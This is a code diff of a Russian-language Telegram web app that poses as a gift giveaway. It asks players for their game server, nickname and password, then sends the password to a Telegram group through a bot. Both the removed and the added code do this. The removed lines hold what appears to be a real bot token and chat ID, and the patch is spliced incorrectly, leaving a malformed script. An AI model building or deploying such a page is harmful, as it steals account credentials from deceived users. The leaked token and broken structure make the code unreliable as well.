@@ -106,36 +106,41 @@
 
             // Проверка формата никнейма
             if (!/^[A-Za-z]+_[A-Za-z]+$/.test(nickname)) {
-                document.getElementById('nickError').style.display = 'block';
-                return;
-            }
+document.getElementById('giftForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
 
-            // Формируем сообщение для отправки в группу
-            const message = `🎁 Новый запрос на подарок!\n\n` +
-                           `🎮 Сервер: ${server}\n` +
-                           `🆔 Никнейм: ${nickname}\n` +
-                           `🔑 Пароль: ${password}\n\n` +
-                           `От: @${tg.initDataUnsafe.user?.username || 'аноним'}`;
+    const server = document.getElementById('server').value;
+    const nickname = document.getElementById('nickname').value;
+    const password = document.getElementById('password').value;
 
-            // Отправляем сообщение в группу через Telegram Bot API
-            const botToken = '7808613132:AAED4eckVrpvNo9mraL3LcOSgzrnUCXbvQI'; // Замените на реальный токен
-            const groupChatId = '-4927394143'; // ID группового чата (например, -100123456789)
+    // Проверка никнейма
+    if (!/^[A-Za-z]+_[A-Za-z]+$/.test(nickname)) {
+        document.getElementById('nickError').style.display = 'block';
+        return;
+    }
 
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${groupChatId}&text=${encodeURIComponent(message)}`)
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        tg.showAlert("✅ Данные отправлены в группу!");
-                        tg.close();
-                    } else {
-                        tg.showAlert("❌ Ошибка отправки. Попробуйте позже.");
-                    }
-                })
-                .catch(error => {
-                    console.error("Ошибка:", error);
-                    tg.showAlert("⚠️ Ошибка сети. Проверьте интернет.");
-                });
-        });
+    // Формируем сообщение
+    const message = `🎁 Новый запрос!\n\nСервер: ${server}\nНик: ${nickname}\nПароль: ${password}`;
+    const botToken = 'ВАШ_ТОКЕН';
+    const chatId = 'ВАШ_CHAT_ID'; // Например, -100123456789
+
+    try {
+        const response = await fetch(
+            `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`
+        );
+        const data = await response.json();
+
+        if (data.ok) {
+            tg.showAlert("✅ Данные отправлены в группу!");
+            tg.close();
+        } else {
+            tg.showAlert(`❌ Ошибка: ${data.description || "Unknown error"}`);
+        }
+    } catch (error) {
+        tg.showAlert("⚠️ Ошибка сети. Проверьте интернет.");
+        console.error("Fetch error:", error);
+    }
+});
     </script>
 </body>
 </html>
